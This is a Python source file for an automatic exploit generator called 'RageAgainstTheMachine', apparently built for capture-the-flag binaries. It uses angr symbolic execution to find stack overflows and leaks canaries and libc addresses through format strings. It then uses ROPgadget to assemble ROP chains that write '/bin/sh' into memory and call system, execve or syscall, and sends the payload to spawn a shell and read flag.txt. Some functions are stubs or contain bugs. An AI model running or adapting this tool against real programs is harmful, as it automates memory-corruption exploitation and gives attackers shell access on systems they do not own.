import angr, claripy
import os, subprocess
import logging
import argparse
import ropgadget

from pwn import *
from binascii import *

# Disable angr logging and pwntools until we need it 
logging.getLogger("angr").setLevel(logging.CRITICAL)
logging.getLogger("os").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib").setLevel(logging.CRITICAL)


context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    terminal=["tmux", "split-window", "-h", "-p 65"]
    #terminal=["st"]
)

# Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
useful_rop_functions = ["__libc_csu_init"]


class rAEG:

    # Initialize class variables that are important here
    def __init__(self, binary_path, libc_path):
        self.binary = binary_path
        self.elf = context.binary =  ELF(binary_path)
        self.libc = context.binary = ELF(libc_path)

        self.exploit_function = None

        self.rop_chain = None
        self.chain_length = 0
        self.string_address = None


        self.format_write_address = None

        self.canary = None
        self.canary_leak = None

        self.flag = None

    # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"CCCCCCCC")
                if path.satisfiable():
                    stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"CCCCCCCC")
                        self.symbolic_padding = stack_smash[:index]
                        #log.info(f"Found symbolic padding: {self.symbolic_padding}")
                        log.info(f"Successfully Smashed the Stack, Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
                        simgr.stashes["mem_corrupt"].append(path)
                    except:
                        log.warning("Could not find index of pc overwrite")
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    # Use angr to explore with the check_mem_corruption function
    def angry_stack_smash(self):
        # Create angr project
        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
        start_addr = self.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 613
        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
        self.symbolic_padding = None

        cfg = self.proj.analyses.CFGFast()

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes["mem_corrupt"] = []

        # This is the address after the last printf is called which is where we want to check the got table 
        # to see which functions are unfilled
        self.last_printf_address = None


        # Check to see if printf is a format string vulnerability
        # If it is record the address to create a state to smash the stack
        def analyze_printf(state):
            # Check if rsi is not a string
            # If it isn't then we know the vulnerable printf statement
            varg = state.solver.eval(state.regs.rsi)
            address = state.solver.eval(state.regs.rip)

            if varg <= 0xff:
                self.last_printf_address = hex(state.callstack.current_return_target)
                print(hex(state.callstack.current_return_target))

        self.proj.hook_symbol("printf", analyze_printf)

        log.info("Attempting to smash the stack")
        self.simgr.explore(step_func=self.check_mem_corruption)

        self.proj.hook_symbol("printf", analyze_printf)

        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
            log.warning("Failed to smash stack")



    # Determine which exploit we need and return which type as a string
    # Also determine the parameters needed, and the function to execute
    def find_vulnerability(self):

        # First find if it is a format string vulnerability
        p = self.start_process(None)
        p.sendline(b"%p")
        #p.recvuntil(b"<<<")
        #output = p.recvline()
        logging.getLogger("pwnlib").setLevel(logging.INFO)
        #if b":" in output:
            #output = output.split(b":")[1]

        #if not b"%p" in output :
            #log.info(f"[+] Found a format string vulnerability with {output}")

            # Check if win function

            # Check if pwnme symbol is present


            # Check if fopen symbol

        #else:
        self.format_leak()
        self.angry_stack_smash()



        # Find important string in the binary
        for s in strings:
            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
            string_output = output.split(b"\n")[2].split(b" ")
            if len(string_output) > 1:
                self.string_address = p64(int(string_output[0],16))
                log.info(f"Found string {s} at {hex(u64(self.string_address))}")
                break

        if self.string_address == None:
            log.warning("Couldn't find any useful strings")

        params = []
        # Find functions to use for exploit by enumerating through one win exploit functions
        for symb in self.elf.sym:
            if symb == "win":
                # Either ret2win, rop parameters, or format got overwrite
                self.exploit_function = "win"
                log.info("Found win function")
                break
            elif symb == "system":
                self.exploit_function = "system"
                log.info("Found system function")
                params = [self.string_address, p64(0)]
                break
            elif symb == "execve":
                self.exploit_function = "execve"
                params = [self.string_address, p64(0), p64(0)]
                log.info("Found execve function")
                break
            elif symb == "syscall":
                self.exploit_function = "syscall"
                log.info("Found syscall function")
                params = [self.string_address, p64(0), p64(0)]
                break
            elif symb == "print_file":
                self.exploit_function = "print_file"
                log.info("Found print_file function")
                params = [self.string_address]
                break

        # Set functions and parameters as a dictionary set

        self.parameters = params


        return None

    # Find pop gadgets to control register
    def find_pop_reg_gadget(self, register):
        # Filters out only pop instructions 
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)


        if len(output) <= 0:
            log.info(f"Couldn't find gadget for {register}")
            return None
        # Iterate through gadgets to find the one with the least instructions
        # This will make sure that the gadget that we want is always first
        min_gadget = output[0]
        min_instructions = output[0].count(b";") + 1
        for gadget in output:
            instructions = gadget.count(b";") + 1
            if instructions <= min_instructions:
                min_instructions = instructions
                min_gadget = gadget

        log.info(f"Found gadget for {register}: {min_gadget}")
        return min_gadget



    # Find gadget to write to writable address in memory
    def find_write_gadget(self):
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", "mov .word ptr \[.*\], *.", "--filter", "jmp"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)

        # First get check to make sure that the same register isn't being dereferenced
        # Add all gadgets that are valid to a list
        # Optimal gadgets will have both registers using 64 bit for the mov write primitive
        # Valid gadgets will be one where the two registers are different
        valid_gadgets = []
        optimal_gadgets = []
        for gadget in output:
            instructions = gadget.split(b";")
            for instruction in instructions:
                if b"ptr" in instruction:
                    reg1 = instruction.split(b"[")[1].split(b",")[0].strip(b"]").strip()
                    reg2 = instruction.split(b"[")[1].split(b",")[1].strip(b"]").strip()
                    if reg1[1:] != reg2[1:]:
                        valid_gadgets.append(gadget)
                        if chr(reg1[0]) == "r":
                            if chr(reg2[0]) == "r":
                                optimal_gadgets.append(gadget)


        # If there are no optimal gadgets choose from valid ones
        if len(optimal_gadgets) <= 0:
            if len(valid_gadgets) <= 0:
                log.warning("Couldn't find write gadget")
                return None
            optimal_gadgets = valid_gadgets

        # Find the gadget with the lowest amount of instructions
        min_gadget = optimal_gadgets[0]
        min_instructions = optimal_gadgets[0].count(b";") + 1
        for gadget in optimal_gadgets:
           instructions = gadget.count(b";") + 1
           if instructions < min_instructions:
               min_instructions = instructions
               min_gadget = gadget

        log.info(f"Found write primitive gadget: {min_gadget}")

        reg1 = min_gadget.split(b"[")[1].split(b",")[0].split(b"]")[0].strip()
        reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
        return min_gadget, reg1, reg2

    # Find writable address in binary
    def find_writable_address(self):
        return None

    # Write string to writable address in the binary
    def rop_chain_write_string(self):
        chain = b""

        write = self.find_write_gadget()
        gadget1 = self.find_pop_reg_gadget(write[1].decode())
        gadget2 = self.find_pop_reg_gadget(write[2].decode())
        addr = self.elf.get_section_by_name(".data").header.sh_addr
        
        pops = gadget1.split(b":")[1].strip().count(b"pop") - 1
        chain += p64(int(gadget1.split(b":")[0].strip(), 16)) + p64(addr)
        while pops > 0:
            pops -= 1
            chain += p64(0)
        
        pops = gadget2.split(b":")[1].strip().count(b"pop") - 1
        chain += p64(int(gadget2.split(b":")[0].strip(), 16)) + b"/bin/sh\x00"
        while pops > 0:
            pops -= 1
            chain += p64(0)
        
        pops = write[0].count(b"pop")
        chain += p64(int(write[0].split(b":")[0].strip(), 16))
        while pops > 0:
            pops -= 1
            chain += p64(0)

        return chain



    # Create a rop chain to execute a function call
    def rop_chain_call_function(self, function, parameters):

        chain = b""
        # If there are any parameters to add to the rop chain then they go in here
        if len(parameters) > 0:
            # If it is a syscall add pop rax, ret and 59 for execve
            if function == "syscall":
                pop_rax_string= self.find_pop_reg_gadget("rax")
                instructions = pop_rax_string.split(b";")
                pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
                chain += pop_rax + p64(59)

                for instruction in instructions[1:]:
                    if b"ret" in instruction:
                        break
                    param = p64(0)
                    for i in range(len(parameters)):
                        if arg_regs[i] in instruction:
                            param = parameters[i]
                    chain += param

            # Reversed in order as the more important parameters go in last
            #for i in range(len(parameters)-1, -1, -1):
            for i in range(len(parameters)):
                pop_reg_string = self.find_pop_reg_gadget(arg_regs[i].decode())
                if pop_reg_string == None:
                    continue
                instructions = pop_reg_string.split(b";")
                pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                chain += pop_reg
                #print(parameters)
                chain += parameters[i]
                for instruction in instructions[1:]:
                    if b"ret" in instruction:
                        break
                    param = p64(0)
                    for i in range(len(parameters)):
                        if arg_regs[i] in instruction:
                            #print(arg_regs[i])
                            param = parameters[i]
                            break;
                    chain += param

        # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
        if (len(chain) + self.chain_length + 8) % 16 != 0:
            chain += p64(self.elf.sym["_fini"])
        if function == "syscall":
            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
            output.pop(0)
            output.pop(0)
            output.pop(-1)
            output.pop(-1)
            output.pop(-1)


            syscall_gadget = int(output[0].split(b":")[0].strip(),16)

            chain += p64(syscall_gadget)
        else:
            chain += p64(self.elf.sym[function])
        log.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")

        return chain


    def generate_rop_chain(self):

        if self.string_address == None:
            #Perform a write primitive
            self.rop_chain = self.rop_chain_write_string()
            self.chain_length += len(self.rop_chain)
            self.string_address = p64(self.elf.get_section_by_name(".data").header.sh_addr)
            self.parameters[0] = self.string_address
            self.rop_chain += self.rop_chain_call_function(self.exploit_function, self.parameters)
        else:
            self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)

        return None

    def format_leak(self):
        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

        control = 0
        start_end = [0,0]
        stack_len = 300
        string = ""

        for  i in range(1, stack_len):

            if control == 1:
                break

            p = process(self.binary)
            offset_str = "%" + str(i) + "$p."
            p.sendline(bytes(offset_str, "utf-8"))
            p.recvuntil(b">>>")

            try:
                p.recvuntil(b": ")
                response = p.recvline().strip().split(b".")


                if response[0].decode() != "(nil)":
                    address = response[0].decode()
                    response = response[0].strip(b"0x")

                    canary = re.search(r"0x[a-f0-9]{14}00", address)
                    if canary and self.elf.canary:
                        self.canary_offset_string = offset_str
                        logging.getLogger("pwnlib").setLevel(logging.INFO)
                        log.info(f"Found canary leak at offset {i}:{address}")
                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

                    libc_leak = re.search(r"0x7f[a-f0-9]{8}4a", address)
                    if libc_leak:
                        self.libc_offset_string = offset_str
                        logging.getLogger("pwnlib").setLevel(logging.INFO)
                        log.info(f"Found libc leak at offset {i}:{address}")
                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

                    try:
                        flag = unhexlify(response)[::-1]
                        if "flag" in flag.decode() and start_end[0] == 0:
                            string += flag.decode()
                            start_end[0] = 1
                        elif start_end[0] == 1 and "}" in flag.decode():
                            string += flag.decode()
                            self.flags.append(string)
                        elif start_end[0] == 1 and "}" not in flag.decode():
                            string += flag.decode()
                        elif "}" in flag.decode() and start_end[1] == 0:
                            string += flag.decode()
                            self.flags.append(string)
                            control = 1
                    except:
                        log.info("RIP")

            except:
                log.info("BOZO")
        logging.getLogger("pwnlib").setLevel(logging.INFO)


    def start_process(self, mode):

        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
        gs = """
            init-pwndbg
        """

        if mode == "GDB":
            return gdb.debug(self.binary, gdbscript=gs)
        elif mode == "REMOTE":
            return remote()
        else:
            return process(self.binary)

    # Function to resolve the libc base offset from the leak
    def resolve_libc_offset(self, leak):
        # Get libc base from debugger/angr

        self.libc.address

        return None

    def exploit(self):
        #p = self.start_process("GDB")
        p = self.start_process(None)
        if self.symbolic_padding != None:
            # Check if regular rop chain or libc leak
            # If there is a leak given then parse the leak
            #
            #chain = self.generate_rop_chain_call()
            if self.rop_chain != None:
                log.info("Sending ROP Chain")
                p.sendline(self.symbolic_padding + self.rop_chain)
                p.sendline(b"cat flag.txt")
                try:
                    output = p.recvuntil(b"}").decode().split("\n")[-1]
                    self.flag = output
                    print(output)
                except:
                    log.info("ROP chain exploit failed")

            else:
                main = p64(self.elf.sym["main"])
                fini = p64(self.elf.sym["_fini"])
                p.sendline(self.symbolic_padding + fini +  main)
                p.interactive()
        # Assume that its a format challenge either format write or format leak
        else:
            # Insert leak stack function here
            p.sendline("%p")
            p.interactive()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        prog = "RageAgainstTheMachine",
        description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
        epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
    )
    parser.add_argument("bin", help="path of binary to exploit")
    #parser.add_argument("libc", help="path of libc shared object")
    args = parser.parse_args()

    rage = rAEG(args.bin, "/opt/libc.so.6")
    #rage = rAEG(args.bin, "/usr/lib/libc.so.6")
    rage.find_vulnerability()
    rage.generate_rop_chain()

    rage.exploit()
